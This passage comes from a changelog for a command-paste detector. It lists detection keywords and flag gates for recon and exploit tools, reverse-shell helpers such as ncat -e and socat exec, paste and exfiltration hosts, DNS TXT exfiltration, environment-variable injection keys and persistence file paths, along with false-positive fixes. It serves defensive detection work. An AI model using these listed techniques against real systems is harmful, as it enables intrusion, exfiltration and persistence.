  `gpiomon`); IaC/CI extras (`kbld`, `imgpkg`, `ytt` - gates, `vendir`,
  `cdk` deploy/destroy/synth/bootstrap, `firebase` deploy/functions:/
  database:/firestore:/auth:/hosting/-, `wrangler` deploy/kv/r2/d1/
  pages/publish/-, `dokku`, `caprover`, `sst` deploy/remove/dev/
  console, `smithy` build/codegen/- gates); recon/exploit vocabulary
  (`enum4linux`, `snaffler`, `certipy`, `rubeus`, `kekeo`,
  `mitmproxy`/`mitmdump`/`mitmweb`, `sslsplit`, `sslstrip`, `sslscan`,
  `sslyze`, `testssl`, `tlssled`, `subjack`, `subzy`, `subover`,
  `tko-subs`, `cloudenum`, `cloudmapper`, `cloudsplaining`, `pacu`
  run/module/exec/session gates, `gophish`, `evilginx`, `modlishka`,
  `muraena`, `setoolkit`, `wifiphisher`, `airgeddon`, `ropgadget`,
  `ropper`, `rop-cli`, `one_gadget`, `pwntools`, `checksec`, `trivy`,
  `checkov`, `terrascan`, `kube-bench`, `kubebench`, `grype`, `syft`,
  `osv-scanner`, `semgrep`, `bandit` -/--/.py gates, `kics` scan/-
  gates).

### Fixed (cycle-254)

- **`ksetup` ⊂ `networksetup`** (`ksetup` added for AD kerberos ops,
  collided with macOS `networksetup -getinfo` admin reads) →
  `!networksetup` guard.
- **`attrib` ⊂ `attribute`** real-word FP (`attribute +h` in docs)
  → `attrib ` bounded.
- **`shadow`/`typeperf`/`netsh wlan`/`chkdsk`/`ytt`/`smithy`/`bandit`/
  `pacu`/`kics`/`proot` real-word FP tightening** → verb/flag gates.
- **Duplicate bare `proot`/`pacu`** (inserted bare + gated) → bare
  dropped, gates kept.
- **Pre-existing suite benign expectations moved to flagged** where
  the new primitives legitimately flag them: `kpartx -l`,
  `the lastlog entry`, `lastlog -u x`, `chage -l x`, `chage docs`,
  `efibootmgr -v/--help`, `efivar -l`, `rubeus hagrid`,
  `secedit /analyze`, `quser`, `kbld`, `pwconv`, `grpconv`; hit token
  `pacu` re-scoped to `pacu run --list`.

### Added (cycle-253)

- **Paste-detector breadth — macOS attack surface, BSD jails, Java/
  signing toolchain, browser automation, misc exec primitives**
  (`hlse_supply.c`): macOS (`security` keychain write/dump verb
  gates, `defaults` write/delete/import/rename, `hdiutil` attach/
  create/detach/chpass/-srcfolder, `system_profiler`, `codesign`
  --sign/-s/--remove/--deep, `mount_afp`/`mount_webdav`, `airport`
  -s/sniff, `open` -a/-b/-e/-F/-R, `sfltool` resetbtm/addbtm,
  `kextunload`, `systemextensionsctl` uninstall/reset, `lsappinfo`,
  `syspolicyd`); BSD/containers (`jls`, `jexec`, `jail` -c/-m/-r/-d,
  `iocage` exec/console/destroy/create, `ezjail`, `bastille`
  cmd/create/destroy/bootstrap/pkg, `pot`, `firecfg`); init/supervision
  (`invoke-rc.d` stop/start, `sv` !csv-guarded verb gates,
  `systemd-cron`, `loginctl` lock/terminate/kill/disable); IPC
  (`busctl` call/set-property/introspect/monitor, `dbus-send`
  --system/--dest/--print-reply, `gdbus` call/emit/monitor, `qdbus`);
  Windows LOLBins + .NET (`iscsicpl`, `wbadmin` get/delete/start-
  backup gates, `expand`/`.cab`+`-f` gate, `extrac32`, `print /D`,
  `wabmig`, `pwlauncher`, `syncappvpublishingserver`, `ieexec`,
  `installutil`, `regasm`, `regsvcs`, `ilasm`, `gacutil`, `corflags`,
  `aspnet_compiler`/`aspnet_regiis`/`aspnet_regsql`/
  `aspnet_regbrowsers`, `mavinject`, `pcalua`, `dump64`, `procdump`,
  `rdrleakdiag`); Java/JVM (`javac` + `.java`/flag gate, `java`
  -agentlib/-agentpath/-javaagent/-agent, `mvn` exec:/ant:/-Dexec,
  `ant` -f/-buildfile/-D, `gradle`, `sbt`, `lein`, `clojure` -e/-M/
  -X/-T); build/queue/task runners (`celery` -a/worker/call/purge,
  `rq` worker/enqueue, `sidekiq`, `rails` console/runner/dbconsole/
  destroy/g, `rake` -f/:/- , `php artisan`/`artisan` verb gates,
  `wp` eval/eval-file/shell/db/user/plugin/theme/cron, `drupal`,
  `bin/console`/`console` doctrine:/make:, `flutter` pub/run/build,
  `expo` publish/build); keygen/signing (`age-keygen`, `minisign`,
  `signify`, `rsign2`, `gpg` --gen-key/--full-gen/--quick-gen,
  `ssh-keygen` -s/-R/-A/-k/-K/-I/-L/-r/-h, `ssh-keyscan`, `puttygen`,
  `keytool`, `jarsigner`, `gitsign`, `rekor-cli`, `fulcio`,
  `productsign`, `pkgbuild`, `productbuild`, `notarytool`, `altool`,
  `stapler` staple/- gates, `electron-packager`/`electron-builder`
  via `electron-` prefix); file/serial/transfer (`tftp` get/put/-,
  `kermit` -s/-g/-C, `lrzsz`, `rz -e`, `sz -e`, `nc6`, `pnetcat`,
  `sbd`); ACL/install (`chmod`/`chown` --reference, `install -o `/
  ` -g `/` -m 777`/` -m 666` prefix-bound); pkg extras (`apt-mark`
  hold/unhold, `aptitude`, `dselect`, `dpkg-divert`); browser
  automation (`puppeteer`, `playwright`, `chromedriver`,
  `geckodriver`, `webdriver`, `selenium` flag/hub gates).

### Fixed (cycle-253)

- **`install ` gate narrowed**: `install -m`/`-s`/`-S` unbound needles
  collided with `python -m pip install` (the `-m` appears earlier in
  the string) and legit `install -m 755` → owner/group needles
  prefix-bound (`install -o `/` -g `) plus mode-777/666 literals.
- **`sv ` ⊂ `csv ` substring collision**: runit supervisor gate gains
  `!csv` guard (`csv stop x` stayed benign).
- **`stapler` self-satisfying needle**: ` staple` ⊂ ` stapler` →
  ` staple ` bounded.
- **`pry` real-word gate**: `pry ` + ` -`/` --` flag gate (`pry open`
  benign).
- **Case bug**: `celery -A` needle must be lowercase (` -a`) under
  the ci_contains needle invariant.
- **Dropped weak needles**: `sw_vers`/`sysctl kern`/`sysctl hw`
  (admin reads too common), `socat -d`, `antlr4`/`jjtree`,
  `getfacl` (read-only), `nectar`, `ant` without flags.

### Added (cycle-252)

- **Paste-detector breadth — X-cookie/input-injection, serial/dial,
  SCSI passthrough + LVM + RAID CLIs, dm-verity/NVDIMM/hibernation,
  console-VT/lockout, CAN-bus + ROS/drone + OpenThread/Reticulum +
  BACnet/CoAP, P2P/anon nets, XMPP/Signal/Telegram CLIs, paste/exfil
  hosts, WebDAV/object stores, BGP/routing + SDN + mDNS/UPnP + WPA +
  RADIUS/TACACS + UUCP, image/package build systems, distro+BSD pkg
  managers, Android device-side suite, MCU flashers, GPU control,
  udisks/PackageKit, HA cluster + Gluster, Xen, DB extras, CA/cert
  forgers, log pipelines + IDS + proxies** (`hlse_supply.c`): X/wayland
  input (xhost bare, xauth, mcookie, synergy/barrierc, ydotool/wtype/
  dotool); serial/dial (pppd call, slattach, minicom, wvdial, sendfax,
  gammu, gnokii, smstools, pand); storage (sg_* SCSI passthrough, lvm
  verb gates, multipath, fusermount, ` -t overlay`, veritysetup,
  integritysetup, ndctl/ipmctl/pmempool, make-bcache, driverctl);
  scheduling + console (anacron, `| batch`, inotifywait, sbkeysync,
  chvt, openvt, fgconsole, deallocvt, vlock, physlock, xtrlock,
  s2disk, pm-hibernate); radio/industrial (direwolf, ax25, kissattach,
  aprx, cansend/candump/canplayer/cangen/cansniffer/slcan,
  obdgpslogger, rosrun/roslaunch/rosservice/rostopic/rosnode,
  mavproxy, dronekit, mavlink, ot-ctl, meshtastic, rnsd/rnstatus/lxmf,
  bacnet verbs, knxd, coap-client/server); P2P/anon (ipfs verb gates,
  zeronet, freenet, lokinet, cjdroute, i2prouter, gnunet-arm);
  messaging/exfil (sendxmpp, profanity, mcabber, signal-cli,
  telegram-cli, weechat, matterhorn flag gate, ix.io, 0x0.st, sprunge,
  termbin, ffsend, dpaste, hastebin, ghostbin, oshi.at, bashupload,
  gist flag gates, pastebin); storage-front ends (cadaver, davfs2,
  s5cmd, s3fs, gof3r, s4cmd, minio); routing/SDN (vtysh, zebra flag
  gate, birdc/bird6/bird, gobgp, exabgp, bmpd, ldpd, ryu verb gates,
  onos !sonos-guarded, opendaylight, faucet flag gate);
  mdns/discovery (avahi-* family, dns-sd verb gates, mdns flag gate,
  natpmpc); wireless/auth (wpa_cli, eapol_test, freeradius, radiusd,
  tac_plus); UUCP (uucp/uux/uuto/uuname); build/image (mkosi, kiwi
  verb gates, osbuild, multistrap, pbuilder, sbuild, mock, rpmbuild,
  rpmspec, debuild, pdebuild, vmdb2, livemedia-creator, lorax,
  image-builder, virt-* suite, cloud-init verb gates, cloud-localds,
  ostree verb gates, rpm-ostree, bootc, transactional-update,
  subscription-manager verb gates, do-release-upgrade, zypper verb
  gates, dnf verb gates, appimagetool/appimaged, pack/ko/kaniko/img/
  buildctl/buildkitd, awx/tower-cli); observability/IDS (fluentd,
  td-agent, fluent-bit, logstash, *beat family, vector flag gates,
  syslog-ng, nxlog, splunk verbs, cscli, suricata, snort, zeek,
  zeekctl, barnyard2, oinkmaster, pulledpork, ossec/manage_agents/
  agent-auth/wazuh, aide, samhain); proxies (haproxy flag gates, kong
  verbs, krakend, envoy, traefik, caddy, serf verbs); infra extras
  (kcat/kafkacat, activemq, escli, solr verbs, pg_ctlcluster,
  mysqladmin verbs, pg_basebackup, pg_receivewal, wal-g, pgbackrest,
  mongoimport, pgloader, mysqlimport, sqlldr, bcp); CA/cert (cfssl,
  certstrap, easyrsa, step ca/step-ca, mkcert, minica, `openssl ca`
  unbounded + verb gates, acme.sh, lego flag gate, dehydrated,
  kdb5_util, kprop/kpropd, kdb5_ldap_util); pkg managers (scoop,
  pkg_add/pkg_delete/pkg_info/pkgadd/pkgrm/swinstall/swremove/pkgin,
  slackware set, opkg/ipkg, emerge verb gates, ebuild/equery/
  dispatch-conf/etc-update/eselect/genkernel/revdep-rebuild,
  xbps-install/xbps-remove, nixos-rebuild); firmware/env (mtd-write,
  nvram verb gates, sysupgrade, fw_printenv/fw_setenv, uboot-env);
  Android device-side (`pm ` !rpm-guarded verb gates, `am ` !prog/
  !telegram-guarded verb gates, settings setprop/appops/dumpsys/
  uiautomator/svc/input/monkey/install-recovery/cmd verb gates);
  MCU/GPU (st-flash, stm32flash, nrfjprog, bossac, teensy-loader,
  espflash, picotool, pyocd, jlinkexe, nvidia-smi reset flags,
  amd-smi, rocm-smi); polkit/pkg (udisksctl verb gates, pkcon/pkmon,
  packagekit, rpm/dpkg/apt-key write gates); HA/RAID/virt (pcs,
  crmsh, corosync-cfgtool, cibadmin, stonith, fence_xvm, gluster,
  megacli, storcli, perccli, arcconf, tw_cli, hpacucli, ssacli,
  sas2ircu/sas3ircu, mfiutil, sesutil, xl/xm/xe/xenstore, lxd bare,
  dmraid); SNMP extras (getprop, snmpset, snmptable, snmpusm,
  snmpvacm, snmptrapd, snmpinform, encode_keychange, snmpconf,
  traptoemail).

### Fixed (cycle-252)

- **`am `/`pm `/`lxd` boundary misses**: `pm ` ⊂ `rpm `/`npm `,
  `am ` ⊂ `program `/`telegram ` → `!rpm`/`!prog`/`!telegram`/
  `!ham `/`!yam` guards; ` lxd ` bounded needle misses at pos 0 →
  bare `lxd` (invented name).
- **Real-word FP gates**: `onos` ⊂ `sonos` → `!sonos` guard; kiwi /
  matterhorn / faucet / lego (real words) → verb/flag gates; anacron
  ⊂ anacrontab → `!anacrontab` guard; ` ca` ⊂ ` ca`refully →
  ` ca ` bounded.
- **Weak/dropped candidates**: ` dat `/` hyp `/` toot ` word-boundary
  needles that cannot fire at position 0 and collide with real words
  removed; `0x0` hex-literal collision avoided via `0x0.st` host;
  `dispatch` (real word) and `sniffer` (real word) not added.
- `mount -t overlay` added to the overlay/escape mount list.

### Added (cycle-251)

- **Paste-detector breadth — time/NTP tampering, NTFS ADS, kernel
  proc/sys writes, FIM-baseline poisoning, backup CLIs, smartcard/HSM,
  IPv6 attack suite, busybox/toybox applets, process-kill flags,
  package-manager write ops, language-runtime exec, env-var injection
  keys, P11 persistence paths** (`hlse_supply.c`): time tampering
  (`hwclock -w`, `ntpq -c`, ptp4l/phc2sys/timemaster); NTFS ADS writes
  (`::$DATA`, `:ads` needles) + `diskpart`/`mklink`/`robocopy /MIR|
  /purge|/mov`/`cipher /c` (EFS encrypt); kernel write surface
  (`> /proc/`/`> /sys/`/`tee /proc|/sys`/`of=/proc|/sys`, sysctl
  ` -p|--load|--system`, `mount -t` bpf/debugfs/tracefs/securityfs/
  cgroup/pstore/configfs/fusectl/mqueue/hugetlbfs/binfmt_misc/proc +
  ` -o bind`); FIM/EDR-baseline + backup (tripwire ` -m`, osqueryd,
  velociraptor flag gates, tarsnap, deja-dup, snapper verbs, restic
  unlock/prune/rebuild-index/repair/key/copy/mount/serve/self-update,
  borg delete/compact/recreate/rename/key/config/mount/serve/
  break-lock/with-lock/upgrade, duplicity remove-all/replicate);
  smartcard/HSM/FIDO/GPG-trust (yubihsm, fido2-token, pkcs11-tool,
  opensc + gpg/gpg2 --import/--edit-key/--delete/--desig/--gen-revoke/
  --recv-keys/--send-keys/--refresh/--update-trustdb/--sign-key/
  --lsign/--quick-/--card/--passwd/--pinentry/--batch, pass verb
  gates, keybase verb gates); password-cracker helpers (zip2john/
  rar2john/ssh2john/pdf2john/keepass2john/luks2john/gpg2john/
  bitlocker2john/pfx2john/vncpcap2john) + stego (outguess, stegsnow,
  stegseek) + carving (foremost/scalpel flag gates); IPv6 attack suite
  (thc-ipv6 parasite6/alive6/detect-new-ip6 + ndisc6/rdisc6/
  tracert6/tcptraceroute6 recon + rogue-RA daemons rtadvd/radvd/
  rtadvctl/rdnssd + dns2socks + squid flag gates); busybox/toybox
  applet gates (nc/tftp/telnet/ftpd/crond/adduser/insmod/modprobe/
  chroot/mount/ifconfig/route/syslogd/sendmail/udhcpc/dnsd/inetd/
  fdisk/mkfs/wget/swapon/ip/arp); exec helpers (ncat ` -e|-c`,
  socat exec|system|proxy|socks|tun, gawk `/inet`, ruby ` -e|-rsocket|
  -rwebrick|-run|-i`); process-kill flags (pkill/killall/skill
  ` -9|-kill|-term|-stop`); service registration (update-rc.d,
  insserv, sysv-rc-conf, initctl emit/start/stop/restart/reload); WSL
  exec (`wsl` -d/-e/.exe/--exec/--cd/--shell/--user/-u/--system/
  --terminate/--shutdown/--mount/--export/--import/--set/--install/
  --update); hardware primitives (devmem2/devmem/memtool/iotools/
  rdmsr/wrmsr/x86info, setpci `=`/`-w`, pciconf ` -w`, pivot_root,
  watchdog ` -`, wdctl); FreeIPMI suite (bmc-device, ipmi-sel,
  ipmi-chassis, bmc-config, ipmi-oem, ipmi_ui, ipmilan, ipmi-fru,
  ipmi-console, pef-config, bmc-info, ipmi-raw, ipmimonitoring,
  rmcp-ping) + usbmuxd/flash_tool/ch341prog/minipro + SDR/VoIP
  (dump1090, gr-gsm, sipp, pjsua, baresip, linphonec, voipong,
  voiphopper, ucsniff, enumiax, iaxflood, rtpbreak, rtpsend,
  siparmyknife); nvme deep ops (fw-download, admin-passthru,
  io-passthru, attach, detach, reset, rescan, write-zeroes,
  write-uncor, dsm, security-send/recv, set-feature, ns-rescan,
  dir-receive, sanitize-log, get-lba-status, format-nvm) + mmc-utils
  (erase/sanitize/hwreset/rpmb/ffu/extcsd/bootpart/writeprotect/
  cache/bkops/gen_cmd/csd/testarea/scr); package-manager write ops
  (snap connect/disconnect/set/unset/disable/enable/refresh/revert/
  download/ack/known/login/logout/create-user/watch/abort/try,
  flatpak remote-add/remote-delete/remote-modify/uninstall/kill/enter/
  repair/update/mask/unmask/make-current/create-usb/permission-/
  document-/metadata/config/build-*/--system/--user, brew link/unlink/
  tap/untap/services/reinstall/uninstall/developer/cask install|
  uninstall, nix-env -e/--uninstall/--delete-generations/-i/--install/
  --rollback/--switch/--upgrade/--set-flag/--profile/--remove-all,
  nix-collect-garbage/nix-channel/nix-build/nix-instantiate/nix-store/
  nix-copy, nix run/shell/profile/store/gc/registry/flake write-verbs/
  eval/bundle/copy, uv run/tool/pip/sync/add/remove/build/publish/init
  + uvx, conda/mamba install/remove/create/env/run/activate/update/
  uninstall/clean/config/init/rename, composer install/require/update/
  remove/global/exec/run/create-project/dump-autoload/config, deno
  install/compile/eval/task/bundle/upgrade/add/remove/uninstall/vendor,
  bun run/add/remove/install/build/pm/x/create/init/upgrade/--bun,
  go mod|work|generate|get|install|run|tool|env -w (cargo excluded),
  rustc --emit|-o|--crate); language-runtime exec (jrunscript, jjs,
  hhvm, php-cgi, qjs, d8, jsc, mujs, duktape, graaljs, hermes,
  mono `.exe|.dll`, runghc, runhaskell, ghci gates, jython, jruby,
  raku, rakudo, guile -c|-l|-s|--eval/.scm, sbcl, clisp, ecl, gcl,
  racket flag gates, chez gates, mit-scheme, chibi-scheme, bigloo,
  gosh boundary, newlisp, picolisp, janet flag gates, fennel gates,
  bb -e/-m, gforth, pforth, rexx, regina, swipl, gprolog, tclsh,
  jimtcl, kscript, kotlinc, bsh., rscript, `r -e`, julia/octave/
  maxima flag gates, scilab, sage, ` gp `, luajit, tarantool, cling,
  cint, nim/nimble/crystal/zig/odin/v/hare verb gates, tsx, ts-node,
  vite-node, swc, stack run/exec/script/ghci, cabal run/exec/install/
  repl, rust-script, evcxr, ensurepip, cpan verb gates, cpanm); ssh
  option exec (` -j`, ` -w`, ` -a`, ` -o remotecommand|setenv|
  requestty|forwardagent|proxyjump|sendenv|permit`); env-var injection
  keys value-bound (`BASH_ENV=/`, `PROMPT_COMMAND=`, `EDITOR=/`,
  `VISUAL=/`, `SUDO_EDITOR=/`, `FCEDIT=/`, `GIT_EDITOR=/`, `GIT_DIR=/`,
  `GIT_EXEC_PATH=/`, `GIT_TEMPLATE_DIR=/`, `GIT_WORK_TREE=/`,
  `GIT_INDEX_FILE=/`, `GIT_OBJECT_DIRECTORY=/`, `GIT_CONFIG=/`,
  `GIT_CONFIG_PARAMETERS=`, `GIT_SSH=`, `GIT_PAGER=/`, `PERL5LIB=`,
  `PERL5OPT=-`, `PERL5DB=`, `PYTHONSTARTUP=/`, `PYTHONPATH=`,
  `PYTHONHOME=/`, `NODE_OPTIONS=-`, `NODE_PATH=`, `RUBYLIB=`,
  `RUBYOPT=`, `ZDOTDIR=/`, `SUDO_ASKPASS=/`, `SSH_AUTH_SOCK=/`,
  `QT_IM_MODULE=`, `GTK_IM_MODULE=`, `XMODIFIERS=`, `GLIBC_TUNABLES=`,
  `LOCPATH=`, `TZDIR=/`, `HOSTALIASES=/`, `KRB5_CONFIG=/`,
  `KRB5_KTNAME=`, `KRB5CCNAME=`, `PKCS11_MODULE_PATH=`, `MANPAGER=`,
  `SYSTEMD_PAGER=`, `LD_AUDIT=`, `LD_PROFILE=`, `DISPLAY=:`,
  `XAUTHORITY=/`, `BROWSER=`, `GPG_AGENT_INFO=`, `PINENTRY=`).
- **P11 persistence-write paths** (`hlse_supply.c`): `sources.list`,
  `apt/preferences`, `apt.conf.d`, `yum.repos.d`, `modprobe.d`,
  `sysctl.d`, `polkit-1`, `dbus-1`, `sudoers.d`, `spool/cron`,
  `cron.d`, `daemon.json`, `.git/hooks`, `.gitmodules`,
  `.gitattributes`, `known_hosts`, `profile.d`, `.pam_environment`,
  `modules-load.d`, `tmpfiles.d`, `binfmt.d`, `hwdb.d`, `firewalld`,
  `fail2ban`, `logrotate.d`, `rsyslog.d`, `audit/rules.d`,
  `auditd.conf`, `ld.so.preload`, `fstab`, `crypttab`, `exports`,
  `netgroup`, `auto.master`, `hostapd`, `wpa_supplicant`, `dhclient`,
  `dhcpcd`, `netplan`, `systemd/network`, `resolvconf`, `hosts.allow`,
  `hosts.deny`, `ipsec.conf`, `ppp/peers`, `wireguard`, `wg0.conf`,
  `openvpn`, `vtund`, `dnsmasq`, `unbound.conf`, `named.conf`,
  `msmtprc`, `fetchmailrc`, `aliases`, `mailname`, `main.cf`,
  `master.cf`, `postfix`, `dovecot`, `saslauthd`, `opendkim`,
  `.bash_profile`, `.ssh/rc`, `.xinitrc`, `.xprofile`, `.xserverrc`,
  `pam.d` write targets flagged at ALERT.

### Fixed (cycle-251)

- **`bun` pre-existing loose rule**: `bun ` + bare `x` fired on any
  x-containing string (and `bunx`⊂`bun x`); `x`→` x ` boundary.
- **Real-word gates**: `velociraptor`→` --| gui|frontend| -|config`;
  `racket`/`guile`/`fennel`/`julia`/`octave`/`maxima`/`ghci`/`chez`/
  `janet` → flag/extension gates (prose & name collisions removed);
  `zig` dropped ` build` (routine); `nix` dropped ` develop`/`build`;
  `go` dropped ` build`/`tool`-boundary + added `!cargo` guard
  (`cargo build` contained `go build`); `bun`→`bun ` boundary + verbs
  trailing-spaced (`the bun added` collision); `gosh`→` gosh `
  (`mongosh` collision); bare `pari` dropped (`parity` collision,
  ` gp ` covers CLI); `rustc` dropped ` -` (`--version` benign);
  `squid` dropped ` --`; `wsl` ` .exe`→`.exe` (boundary fix);
  `chibi`→`chibi-scheme`.
- **Suite re-expectation**: 14 benigns moved to hits — `cipher /c`,
  `robocopy /mir` x2, `sysctl --system`, `update-rc.d --help`,
  `uvx` exec forms, `diskpart list`, `wsl --install`, `go get`,
  `go tools list`, `tarsnap`/`newlisp`/`scilab` docs mentions —
  all design-intended signals.

### Added (cycle-250)

- **Paste-detector breadth — storage/fs teardown, screenshot &
  input-injection/keyloggers, miner & C2/RAT/stealer vocabulary,
  residual LOLBins, exec helpers, DNS TXT exfil, external-IP recon,
  xdg launchers, systemd/package/loader tampering, hardware recon,
  env-var injection keys** (`hlse_supply.c`): FS/teardown extras
  (fstrim, mkswap, resize2fs, e2label, tune2fs flag gates,
  xfs_admin/xfs_io/xfs_bmap/xfs_estimate/xfs_freeze/xfs_growfs/
  xfs_metadump/xfs_repair, btrfstune, bcache/make-bcache, btrfs
  send/receive/balance/rescue/scrub/property, mdadm --create/
  --assemble, dmsetup suspend/create/wipe/reload, zdb/ztest/
  zstreamdump/zinject/zvol_wait/zfs_ids_to_path, zpool create/scrub/
  initialize/import, zfs snapshot/clone/share/mount/upgrade/set/
  project); screenshot/recording/input (grim, slurp, maim, hyprshot,
  grimblast, xfce4-screenshooter, pw-record, avconv, sox gates,
  motioneye/zoneminder/zmeventnotification/motion, xte, xvkbd, xdo,
  input-recorder, keyd gates, keysniffer); miner/C2/stealer
  vocabulary (tnn-miner, cryptonight, randomx, silenttrinity, dcrat,
  vidar, meduza + gated sliver/quasar/warzone/ares/orion/villager/
  merlin/octopus); residual LOLBins (esentutl flag gates incl. /r,
  forfiles /c, mmc gates, wmic /node//namespace//process//bios,
  manage-bde -protectors -delete/-changepassword); exec helpers
  (ncat --lua-exec, socat system:, parallel ::|--pipe, gawk/mawk
  system(|begin| getline, tar --to-command); DNS TXT exfil
  (dig/nslookup/host/drill TXT/axfr gates, doggo, kdig); external-IP
  recon endpoints (curl|wget x ifconfig.me/ident.me/icanhazip.com/
  api.ipify.org/checkip/ipinfo.io); xdg launchers (xdg-open/gio/
  kde-open/sensible-browser/x-www-browser/gnome-open/exo-open/open
  x ` http`); systemd/package/loader tampering (systemd-dissect,
  systemd-volatile-root, machinectl bind/copy-to/import-*,
  alternatives --set/--install/--config/--remove/--auto/--slave/
  --master/--altdir/--admindir, dpkg-divert, dpkg-statoverride,
  rpm --initdb/--rebuilddb/-e/--erase, rpm2cpio, mkinitcpio,
  mkinitfs, ldconfig -l/-r/-f, setfacl write flags, luksmeta,
  keyctl list/add/new_session); hardware recon (dmidecode, smbios,
  biosdecode, vpddecode, lshw, hwinfo, inxi); env-var injection keys
  (`strstr` case-sensitive, value-bound: `ENV=/`, `LESSOPEN=|//`,
  `LESSCLOSE=|//`, `PAGER=//sh`, `PS4=$`, `BASH_XTRACEFD=`, `IFS=//:`,
  `SHELLOPTS=`, `GLOBIGNORE=`, `MALLOC_TRACE=/`, `NLSPATH=/ or %`,
  `LD_ORIGIN_PATH=/`, `GCC_EXEC_PREFIX=/`, `CPATH=/ or :`,
  `XDG_DATA_DIRS=/ or :`, `MAILCAP=/`).
- **P11 persistence-write paths** (`hlse_supply.c`): `.xsession`,
  `.bash_logout`, `.zlogout`, `ssh_config`, `.gtkrc`, `.Xresources`,
  `.xmodmaprc`, `.inputrc`, `.screenrc`, `.muttrc`, `.mailrc`,
  `.procmailrc`, `.pinerc`, `.lynxrc`, `.wgetrc`, `.git-crypt`,
  `.config/git`, `.gnomerc`, `.kderc`, `kdeglobals`,
  `kglobalshortcutsrc`, `kwinrc`, `.config/pulse`, `.config/systemd`,
  `.local/share/applications`, `environment.d`, `.ssh/environment`,
  `.ssh/sshrc`, `native-messaging-hosts`/`NativeMessagingHosts`,
  `.vscode/extensions`, `.config/Code`, `.gcloud` write targets
  flagged at ALERT.

### Fixed (cycle-250)

- **`ci_contains` needle-case invariant restored** (`hlse_supply.c`):
  `ci_contains` lowercases only the haystack — any needle with an
  uppercase char can never match. All 16 mixed-case needles across
  the file were dead; lowercased them (` -D`/` -U`/` -H`/` -P`/` -A`/
  ` -M`/` -B`/` -I`/` -O`/` -L`/` -E`/` -dmS`/`init S` forms) and
  deduplicated the resulting identical needle pairs, resurrecting
  dormant detections.
- **Lowercase-collision cleanup** (`hlse_supply.c`): `tune2fs` gate
  dropped ` -l` (lowercased ` -L` collides with the benign list
  flag); `redline` gate removed as redundant (pre-existing
  `redline`+` -` rule at the LOLBin chain dominates);
  `alternatives` ` --` self-satisfy split into verb flags;
  `setfacl` ` -`/`getcap` bare tightened to write/read flags;
  env-var keys bound to path-ish values so prose like `IFS=x` or
  `the PAGER=` stays clean.
- **Suite re-expectation**: 33 benigns moved to hits — docs-mention
  invented names (bcache/zdb/ztest/xvkbd/xdo/keysniffer/cryptonight/
  randomx/vidar/meduza/doggo/kdig/rpm2cpio/mkinitcpio/dmidecode/
  smbios/lshw/hwinfo/inxi), `keyd -m`, `maim x.png`, `mdadm
  --assemble`, `zfs snapshot`, `zpool import`, `setfacl -m/-b`,
  `esentutl /r`, `dig ... TXT` — all design-intended signals.

### Added (cycle-249)

- **Paste-detector breadth — interpreter inline-exec, shell escapes,
  RMM remote-access fleet, miners/wallets, storage teardown, exec
  primitives** (`hlse_supply.c`): interpreter/REPL inline execution
  (`nodejs -e`, `irb -e`, `php -a`, `groovysh`, `nashorn`, `scala`/
  `clj`/`iex`/`erl` flag gates, `pwsh -e`, `perl -pi/-pe`, `vim`/
  `nvim` `+!`/`+:`, `less`/`more`/`man` ` !` escapes, `zip -tt`,
  `bash -c`, ` sh ` + ` -c`, `enable -f` + `.so`/slash loader),
  terminal-emulator spawns (`xterm`/`urxvt`/`rxvt`/`alacritty`/
  `kitty`/` st `/`konsole`/`gnome-terminal`/`xfce4-terminal`/
  `lxterminal`/`mate-terminal`/`tilix`/`terminator`/`sakura`/`termite`/
  `foot`/`wezterm` exec flags, `xinit`, `tmux` new/send-keys/
  run-shell/respawn/source/bind/set-hook, `screen` detached/exec),
  exec-wrapper × payload-target gates (`flock`/`nice`/`timeout`/
  `stdbuf`/`ionice`/`taskset`/`chrt`/`schedtool`/`env`/`chroot`/
  `unshare`/`setpriv`/`ssh-agent` crossed with shell/interpreter/
  `/bin` targets), `capsh --`/`--decode`, ` su ` + flag, `gdb -ex`,
  `lldb` flags, `strace` output/expression forms, package-manager
  exec hooks (`npm`/`gem`/`bundle exec`, `cpan -e`, `go tool`/
  `generate`, `dotnet run`/`exec`/`fsi`, `cargo-script`), IRC/C2
  (`ircd`, `ngircd`, `irssi`/`weechat`/`hexchat` flag gates, `ftp`
  flag forms, `lftp`, `ncftp`), RMM remote-access fleet
  (`connectwise`, `gotomypc`, `dameware`, `dwrcs`, `bomgar`,
  `beyondtrust`, `ninjaone`, `kaseya`, `n-able`, `meshcommander`,
  `uvnc`, `krdc`, `ssvnc`, `vinagre`, plus gated `parsec`/`moonlight`/
  `sunshine`/`supremo`/`tactical`, `zoho assist`, `fixme.it`,
  `showmypc`), crypto miners and wallet CLIs (`claymore`/`t-rex`/
  `trex`/`geth`/`parity`/`electrum` verb gates, `monerod`,
  `monero-wallet-cli`, `bitcoin-cli`/`bitcoin-qt`/`bitcoind`,
  `litecoin-cli`, `dogecoind`, `dash-cli`, `zcash-cli`, `p2pool`,
  `kinsing`, `kdevtmpfsi`), backup destroy/exfil (`duplicity` remove,
  `rsnapshot`, `bacula`, `bareos`, `amanda`, `bup`, `kopia`,
  `tarsnap`, `timeshift --delete`), SQL/LDAP/IPA clients (`osql`,
  `isql`, `tsql`, `sqsh`, `dsql` flag gates, `slapcat`/`slapadd`/
  `slapindex`, `ipa` verb gate, `ipa-client-install`, `realmd`),
  AD/Windows infrastructure recon (`ntdsutil`, `repadmin`, `dnscmd`,
  `dfsutil`, `dfsradmin`, `mountvol`, `wmic ntdomain`), storage/NVMe
  teardown (`nvme` reset/ns-delete/subsystem-reset/disconnect/
  attach-ns, `sgdisk -Z`/`--clear`/`-o`, `parted` rm/mkpart/set,
  `hdparm` sleep/dco/read-sector, `sdparm` command/clear/set/reset,
  `sg_start` stop/eject, `sg_prevent -a`/`--allow`, `camcontrol`
  stop/format/sanitize, `zpool` export/offline/detach/clear-class
  verbs, `zfs` send/rollback/promote/rename/redact/jail/key ops,
  `cryptsetup` luksClose/lukssuspend/token/luksKill/reencrypt/convert/
  config/remove, `vgchange`/`lvchange` deactivate/permission flags,
  `blkdiscard`, `blkzone reset`, `zramctl --reset`, `kpartx` delete
  forms, `dmraid` flags, `multipath` flush/delete, `multipathd -k`,
  `iscsiadm` delete, `modprobe`/`rmmod`/`depmod`, ` sv ` verb gate),
  SNMP/NSM/SCADA (`snmptable`, `snmpnetstat`, `snmpusm`, `snmpvacm`,
  `snmptranslate`, `snmpinform`, `snmpd`, `snmptrapd`, `zeekctl`,
  `broctl`, `argus`, `ntopng`, `ntop -`, `ostinato`, `etterfilter`,
  `sshow`, `opcua`, `bacnet`, `mbusd`, `profinet`, `s7comm`,
  `modbus`), PowerShell remoting/WMI persistence (`enter-pssession`,
